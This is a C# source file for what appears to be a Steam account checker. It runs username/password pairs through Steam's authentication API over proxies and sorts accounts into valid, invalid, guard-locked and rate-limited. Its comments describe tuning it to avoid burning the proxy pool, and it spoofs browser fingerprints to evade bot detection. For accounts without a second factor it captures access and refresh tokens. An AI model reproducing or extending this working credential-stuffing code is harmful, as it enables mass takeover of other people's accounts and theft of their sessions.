using System.Net;
using System.Text.Json;
using SteamForge.Core.Models;

namespace SteamForge.Core.Auth;

public sealed class CredentialOutcome
{
    public required CheckStatus Status { get; init; }
    public GuardKind Guard { get; init; } = GuardKind.None;
    public ulong SteamId { get; set; }
    public ulong ClientId { get; init; }
    public byte[] RequestId { get; init; } = Array.Empty<byte>();
    public string? AccessToken { get; init; }
    public string? RefreshToken { get; init; }
    public string? Reason { get; init; }
}

/// <summary>
/// Drives Steam's IAuthenticationService credentials flow over HTTP.
///
/// The classification is deliberately layered. A single signal is never trusted:
///   1. HTTP status — 429/403 are transport verdicts, not credential verdicts.
///   2. X-eresult header — Steam puts the EResult here even on an empty body.
///   3. Body contents — client_id + steamid presence, then allowed_confirmations.
/// That layering is what separates "wrong password" from "this proxy is rate limited",
/// which naive checkers conflate and then burn the proxy pool on.
/// </summary>
public sealed class SteamWebAuthClient : IDisposable
{
    private static readonly TimeSpan DefaultTimeout = TimeSpan.FromSeconds(20);

    private readonly HttpClient _http;
    private readonly AuthMode _mode;
    private readonly Fingerprint _fp;
    private readonly bool _ownsHttp;

    public SteamWebAuthClient(HttpClient http, AuthMode mode, Fingerprint fp, bool ownsHttp = false)
    {
        _http = http;
        _mode = mode;
        _fp = fp;
        _ownsHttp = ownsHttp;
    }

    public static SteamWebAuthClient Create(Proxy.ProxyEntry? proxy, AuthMode mode, Fingerprint fp, TimeSpan? timeout = null)
        => new(HttpFactory.CreateClient(proxy, timeout ?? DefaultTimeout, fp), mode, fp, ownsHttp: true);

    // ---- Step 1: RSA public key ----

    public async Task<RsaKey> GetRsaKeyAsync(string accountName, CancellationToken ct = default)
    {
        if (_mode == AuthMode.WebApiJson)
        {
            var json = JsonSerializer.Serialize(new { account_name = accountName });
            var url = $"{Endpoints.RsaKey}?origin={Uri.EscapeDataString("https://store.steampowered.com")}" +
                      $"&input_json={Uri.EscapeDataString(json)}";

            using var req = new HttpRequestMessage(HttpMethod.Get, url);
            ApplyCommonHeaders(req);
            using var resp = await _http.SendAsync(req, ct).ConfigureAwait(false);
            var text = await resp.Content.ReadAsStringAsync(ct).ConfigureAwait(false);

            var key = ParseRsaJson(text);
            if (key is null)
                throw new SteamAuthException($"RSA key fetch failed (HTTP {(int)resp.StatusCode})");
            return key;
        }
        else
        {
            var encoded = AuthMessages.BuildRsaKeyRequest(accountName);
            var url = $"{Endpoints.RsaKey}?origin={Uri.EscapeDataString("https://store.steampowered.com")}" +
                      $"&input_protobuf_encoded={Uri.EscapeDataString(encoded)}";

            using var req = new HttpRequestMessage(HttpMethod.Get, url);
            ApplyCommonHeaders(req);
            using var resp = await _http.SendAsync(req, ct).ConfigureAwait(false);
            var bytes = await resp.Content.ReadAsByteArrayAsync(ct).ConfigureAwait(false);

            var key = AuthMessages.ParseRsaKeyResponse(bytes);
            if (key is null)
                throw new SteamAuthException($"RSA key fetch failed (HTTP {(int)resp.StatusCode})");
            return key;
        }
    }

    // ---- Step 2: BeginAuthSessionViaCredentials ----

    public async Task<(BeginAuthResult Result, int? XEresult)> BeginAuthAsync(
        string accountName,
        string encryptedPassword,
        string timestamp,
        CancellationToken ct = default)
    {
        HttpRequestMessage req;

        if (_mode == AuthMode.WebApiJson)
        {
            var payload = JsonSerializer.Serialize(new
            {
                account_name = accountName,
                encrypted_password = encryptedPassword,
                encryption_timestamp = timestamp,
                remember_login = true,
                website_id = "Store",
                platform_type = (int)AuthPlatformType.MobileApp,
                device_friendly_name = _fp.UserAgent,
                persistence = 1,
            });
            req = new HttpRequestMessage(HttpMethod.Post, Endpoints.BeginAuth)
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                {
                    ["input_json"] = payload,
                }),
            };
        }
        else
        {
            var encoded = AuthMessages.BuildBeginAuthRequest(
                accountName, encryptedPassword, timestamp,
                AuthPlatformType.MobileApp, _fp.UserAgent, rememberLogin: true, persistence: AuthPersistence.Persistent);

            // Steam's endpoint takes input_protobuf_encoded as a urlencoded form field. Sending
            // it as multipart/form-data comes back HTTP 400 with no X-eresult at all — and since
            // 400 has no body to classify, the failure surfaces later as a stream-copy error
            // that says nothing about the real cause.
            req = new HttpRequestMessage(HttpMethod.Post, Endpoints.BeginAuth)
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                {
                    ["input_protobuf_encoded"] = encoded,
                }),
            };
        }

        ApplyCommonHeaders(req);
        req.Headers.TryAddWithoutValidation("Origin", "https://store.steampowered.com");
        req.Headers.TryAddWithoutValidation("Referer", "https://store.steampowered.com/");

        using var resp = await _http.SendAsync(req, ct).ConfigureAwait(false);
        var xeresult = ReadXEresult(resp);

        var bytes = await resp.Content.ReadAsByteArrayAsync(ct).ConfigureAwait(false);
        var parsed = _mode == AuthMode.WebApiJson
            ? ParseBeginJson(bytes)
            : AuthMessages.ParseBeginAuthResponse(bytes);

        if (parsed is null)
        {
            // Steam returns an empty body with only X-eresult on rejection. Anything that
            // parses to nothing is a rejection or a transport problem, never a success.
            return (new BeginAuthResult(), xeresult);
        }

        return (parsed, xeresult);
    }

    // ---- Step 3: PollAuthSessionStatus ----

    public async Task<PollAuthResult?> PollAsync(ulong clientId, byte[] requestId, CancellationToken ct = default)
    {
        HttpRequestMessage req;

        if (_mode == AuthMode.WebApiJson)
        {
            var payload = JsonSerializer.Serialize(new
            {
                client_id = clientId.ToString(),
                request_id = Convert.ToBase64String(requestId),
            });
            req = new HttpRequestMessage(HttpMethod.Post, Endpoints.PollAuth)
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string> { ["input_json"] = payload }),
            };
        }
        else
        {
            var encoded = AuthMessages.BuildPollRequest(clientId, requestId);
            req = new HttpRequestMessage(HttpMethod.Post, Endpoints.PollAuth)
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                {
                    ["input_protobuf_encoded"] = encoded,
                }),
            };
        }

        ApplyCommonHeaders(req);
        req.Headers.TryAddWithoutValidation("Origin", "https://store.steampowered.com");
        req.Headers.TryAddWithoutValidation("Referer", "https://store.steampowered.com/");

        using var resp = await _http.SendAsync(req, ct).ConfigureAwait(false);
        var bytes = await resp.Content.ReadAsByteArrayAsync(ct).ConfigureAwait(false);

        return _mode == AuthMode.WebApiJson ? ParsePollJson(bytes) : AuthMessages.ParsePollResponse(bytes);
    }

    // ---- Combined ----

    /// <summary>
    /// Runs the full credentials flow: RSA → Begin → classify → Poll.
    /// Guard-locked accounts stop after classify because no token is obtainable without
    /// the second factor; they are still a successful credential verdict.
    /// </summary>
    public async Task<CredentialOutcome> CheckAsync(string accountName, string password, CancellationToken ct = default)
    {
        RsaKey key;
        try
        {
            key = await GetRsaKeyAsync(accountName, ct).ConfigureAwait(false);
        }
        catch (SteamAuthException ex)
        {
            return new CredentialOutcome { Status = CheckStatus.Error, Reason = ex.Message };
        }
        catch (TaskCanceledException)
        {
            return new CredentialOutcome { Status = CheckStatus.Error, Reason = "timeout" };
        }
        catch (Exception ex)
        {
            return new CredentialOutcome { Status = CheckStatus.Error, Reason = Trim(ex.Message) };
        }

        string encrypted;
        try
        {
            encrypted = SteamRsa.EncryptPassword(password, key.ModulusHex, key.ExponentHex);
        }
        catch (Exception ex)
        {
            return new CredentialOutcome { Status = CheckStatus.Error, Reason = "rsa: " + Trim(ex.Message) };
        }

        BeginAuthResult begin;
        int? xeresult;
        try
        {
            (begin, xeresult) = await BeginAuthAsync(accountName, encrypted, key.Timestamp, ct).ConfigureAwait(false);
        }
        catch (TaskCanceledException)
        {
            return new CredentialOutcome { Status = CheckStatus.Error, Reason = "timeout" };
        }
        catch (Exception ex)
        {
            return new CredentialOutcome { Status = CheckStatus.Error, Reason = Trim(ex.Message) };
        }

        // Layer 2 — Steam's own verdict code.
        var verdict = Classify(xeresult, begin);
        if (verdict is { } v) return v;

        // Layer 3 — the body. A populated response with steamid+client_id means the
        // credentials were accepted; confirmations tell us whether we can get a token.
        if (begin.SteamId == 0 || begin.ClientId == 0)
        {
            return new CredentialOutcome
            {
                Status = CheckStatus.Invalid,
                Reason = "no steamid/client_id in response",
            };
        }

        var guard = MapGuard(begin.Confirmations);
        if (guard != GuardKind.None)
        {
            return new CredentialOutcome
            {
                Status = CheckStatus.GuardLocked,
                Guard = guard,
                SteamId = begin.SteamId,
                ClientId = begin.ClientId,
                RequestId = begin.RequestId,
                Reason = guard.ToString(),
            };
        }

        // No guard — poll for the access token.
        for (int attempt = 0; attempt < 4; attempt++)
        {
            if (attempt > 0)
                await Task.Delay(TimeSpan.FromSeconds(1.5 * attempt), ct).ConfigureAwait(false);

            PollAuthResult? poll;
            try
            {
                poll = await PollAsync(begin.ClientId, begin.RequestId, ct).ConfigureAwait(false);
            }
            catch (TaskCanceledException)
            {
                continue;
            }
            catch
            {
                continue;
            }

            if (poll is null) continue;

            if (!string.IsNullOrEmpty(poll.AccessToken))
            {
                return new CredentialOutcome
                {
                    Status = CheckStatus.Valid,
                    Guard = GuardKind.None,
                    SteamId = begin.SteamId,
                    ClientId = begin.ClientId,
                    RequestId = begin.RequestId,
                    AccessToken = poll.AccessToken,
                    RefreshToken = poll.RefreshToken,
                };
            }

            // Steam signals a challenge the client must answer; treat as guard-locked
            // rather than an error so it lands in the right bucket.
            if (!string.IsNullOrEmpty(poll.NewChallengeUrl))
            {
                return new CredentialOutcome
                {
                    Status = CheckStatus.GuardLocked,
                    Guard = GuardKind.DeviceConfirmation,
                    SteamId = begin.SteamId,
                    ClientId = begin.ClientId,
                    RequestId = begin.RequestId,
                    Reason = "challenge required",
                };
            }
        }

        return new CredentialOutcome
        {
            Status = CheckStatus.Error,
            SteamId = begin.SteamId,
            Reason = "poll exhausted without access_token",
        };
    }

    // ---- Classification helpers ----

    private static CredentialOutcome? Classify(int? xeresult, BeginAuthResult begin)
    {
        switch (xeresult)
        {
            case 20:
            case 84:
                return new CredentialOutcome { Status = CheckStatus.RateLimited, Reason = $"EResult {xeresult}" };
            case 5:
                return new CredentialOutcome { Status = CheckStatus.Invalid, Reason = "EResult 5 (InvalidPassword)" };
            case 18:
                return new CredentialOutcome { Status = CheckStatus.NotFound, Reason = "EResult 18 (AccountNotFound)" };
            case 17:
                return new CredentialOutcome { Status = CheckStatus.Invalid, Reason = "EResult 17 (Banned)" };
            case 24:
                return new CredentialOutcome { Status = CheckStatus.RateLimited, Reason = "EResult 24 (LoginDeniedThrottle)" };
            case 3:
                return new CredentialOutcome { Status = CheckStatus.Error, Reason = "EResult 3 (NoConnection)" };
        }

        // interval without client_id is Steam's rate-limit back-channel on some paths.
        if (begin.ClientId == 0 && begin.Interval > 5)
            return new CredentialOutcome { Status = CheckStatus.RateLimited, Reason = $"interval={begin.Interval}" };

        return null;
    }

    private static GuardKind MapGuard(List<AuthConfirmationType> confirmations)
    {
        if (confirmations.Count == 0) return GuardKind.None;
        if (confirmations.Contains(AuthConfirmationType.DeviceCode)) return GuardKind.DeviceCode;
        if (confirmations.Contains(AuthConfirmationType.DeviceConfirmation)) return GuardKind.DeviceConfirmation;
        if (confirmations.Contains(AuthConfirmationType.EmailCode)) return GuardKind.EmailCode;
        // Only "None" offered — no second factor.
        return GuardKind.None;
    }

    private static int? ReadXEresult(HttpResponseMessage resp)
    {
        if (resp.Headers.TryGetValues("X-eresult", out var vals))
        {
            var raw = vals.FirstOrDefault();
            if (int.TryParse(raw, out var n)) return n;
        }
        if (resp.Headers.TryGetValues("x-eresult", out var lower))
        {
            var raw = lower.FirstOrDefault();
            if (int.TryParse(raw, out var n)) return n;
        }
        return null;
    }

    private void ApplyCommonHeaders(HttpRequestMessage req)
    {
        // Steam's auth endpoints are HTTP/1.1. Requesting exactly 1.1 avoids the h2
        // ALPN/SETTINGS exchange, which is a fingerprint tell for non-browser clients.
        req.Version = System.Net.HttpVersion.Version11;
        req.VersionPolicy = System.Net.Http.HttpVersionPolicy.RequestVersionExact;

        foreach (var kv in _fp.ClientHints())
            req.Headers.TryAddWithoutValidation(kv.Key, kv.Value);
        req.Headers.TryAddWithoutValidation("Accept", "application/json, text/javascript, */*; q=0.01");
        req.Headers.TryAddWithoutValidation("Accept-Language", "en-US,en;q=0.9");
        req.Headers.TryAddWithoutValidation("sec-fetch-dest", "empty");
        req.Headers.TryAddWithoutValidation("sec-fetch-mode", "cors");
        req.Headers.TryAddWithoutValidation("sec-fetch-site", "same-site");
    }

    // ---- JSON body parsing (WebApiJson mode) ----

    private static RsaKey? ParseRsaJson(string text)
    {
        try
        {
            using var doc = JsonDocument.Parse(text);
            if (!doc.RootElement.TryGetProperty("response", out var resp)) return null;
            if (resp.ValueKind != JsonValueKind.Object) return null;

            var mod = resp.TryGetProperty("publickey_mod", out var m) ? m.GetString() : null;
            var exp = resp.TryGetProperty("publickey_exp", out var e) ? e.GetString() : null;
            var ts = resp.TryGetProperty("timestamp", out var t) ? t.GetString() : null;
            if (string.IsNullOrEmpty(mod) || string.IsNullOrEmpty(exp)) return null;

            return new RsaKey { ModulusHex = mod, ExponentHex = exp, Timestamp = ts ?? "0" };
        }
        catch
        {
            return null;
        }
    }

    private static BeginAuthResult? ParseBeginJson(byte[] bytes)
    {
        try
        {
            using var doc = JsonDocument.Parse(bytes);
            if (!doc.RootElement.TryGetProperty("response", out var resp)) return null;
            if (resp.ValueKind != JsonValueKind.Object) return null;

            ulong clientId = 0, steamId = 0;
            uint interval = 0;
            byte[] requestId = Array.Empty<byte>();
            var confirmations = new List<AuthConfirmationType>();

            if (resp.TryGetProperty("client_id", out var cid))
            {
                if (cid.ValueKind == JsonValueKind.String && ulong.TryParse(cid.GetString(), out var s)) clientId = s;
                else if (cid.ValueKind == JsonValueKind.Number) clientId = cid.GetUInt64();
            }
            if (resp.TryGetProperty("steamid", out var sid))
            {
                if (sid.ValueKind == JsonValueKind.String && ulong.TryParse(sid.GetString(), out var s)) steamId = s;
                else if (sid.ValueKind == JsonValueKind.Number) steamId = sid.GetUInt64();
            }
            if (resp.TryGetProperty("interval", out var iv) && iv.ValueKind == JsonValueKind.Number)
                interval = (uint)iv.GetInt32();
            if (resp.TryGetProperty("request_id", out var rid))
            {
                var raw = rid.GetString();
                if (!string.IsNullOrEmpty(raw))
                {
                    try { requestId = Convert.FromBase64String(raw); }
                    catch { requestId = System.Text.Encoding.UTF8.GetBytes(raw); }
                }
            }

            if (resp.TryGetProperty("allowed_confirmations", out var ac) && ac.ValueKind == JsonValueKind.Array)
            {
                foreach (var item in ac.EnumerateArray())
                {
                    if (item.TryGetProperty("confirmation_type", out var ct))
                    {
                        if (ct.ValueKind == JsonValueKind.Number) confirmations.Add((AuthConfirmationType)ct.GetInt32());
                        else if (ct.ValueKind == JsonValueKind.String && int.TryParse(ct.GetString(), out var n))
                            confirmations.Add((AuthConfirmationType)n);
                    }
                }
            }

            if (clientId == 0 && steamId == 0) return null;

            return new BeginAuthResult
            {
                ClientId = clientId,
                SteamId = steamId,
                Interval = interval,
                RequestId = requestId,
                Confirmations = confirmations,
            };
        }
        catch
        {
            return null;
        }
    }

    private static PollAuthResult? ParsePollJson(byte[] bytes)
    {
        try
        {
            using var doc = JsonDocument.Parse(bytes);
            if (!doc.RootElement.TryGetProperty("response", out var resp)) return null;
            if (resp.ValueKind != JsonValueKind.Object) return null;

            string? access = resp.TryGetProperty("access_token", out var a) ? a.GetString() : null;
            string? refresh = resp.TryGetProperty("refresh_token", out var r) ? r.GetString() : null;
            string? account = resp.TryGetProperty("account_name", out var ac) ? ac.GetString() : null;
            string? challenge = resp.TryGetProperty("new_challenge_url", out var cu) ? cu.GetString() : null;

            if (string.IsNullOrEmpty(access) && string.IsNullOrEmpty(refresh)) return null;

            return new PollAuthResult
            {
                AccessToken = access,
                RefreshToken = refresh,
                AccountName = account,
                NewChallengeUrl = challenge,
            };
        }
        catch
        {
            return null;
        }
    }

    private static string Trim(string s)
    {
        var idx = s.IndexOfAny(new[] { '\r', '\n' });
        return idx >= 0 ? s[..idx] : s;
    }

    public void Dispose()
    {
        if (_ownsHttp) _http.Dispose();
    }
}

public sealed class SteamAuthException : Exception
{
    public SteamAuthException(string message) : base(message) { }
}

internal static class Endpoints
{
    public const string RsaKey = "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1";
    public const string BeginAuth = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1";
    public const string PollAuth = "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1";
}
